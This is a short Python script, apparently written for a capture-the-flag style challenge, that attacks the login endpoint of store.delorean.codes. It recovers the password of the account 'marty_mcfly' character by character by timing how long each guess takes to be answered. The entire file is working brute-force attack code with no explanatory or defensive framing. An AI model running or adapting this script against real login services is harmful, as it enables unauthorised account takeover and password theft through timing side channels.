
import datetime, requests, math

ALPHA_NUMS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
BASE_URL = 'https://store.delorean.codes/u/'
username = 'jackcbrown89'
endpoint = '/login'

finalPassword = 'ONYS6eCKaz'
currentReqTime = 0
lastchartime = 62386
for current in xrange(12):
	i = 0
	for char in ALPHA_NUMS:
		currentPassword = finalPassword + char

		# Make Requests to API
		requestUrl = BASE_URL + username + endpoint
		payload = {'username': 'marty_mcfly', 'password': currentPassword}

		response = requests.post(requestUrl, data=payload)
		time = response.elapsed.microseconds
		if abs(time-lastchartime) > 400000:
			print('time delta:\t%s' % (time-lastchartime))
			lastchartime = time
			print('last char time:\t%s' % lastchartime)
			currentReqTime += 400000
			finalPassword += char
			print('~~~~~~~\n\n\n%s' %
				finalPassword + " : " + str(time) + "ms\n\n\n")
			break
		else:
			print(time-lastchartime)
			lastchartime = time
			print(char+ " : " + str(time))
			i += 1
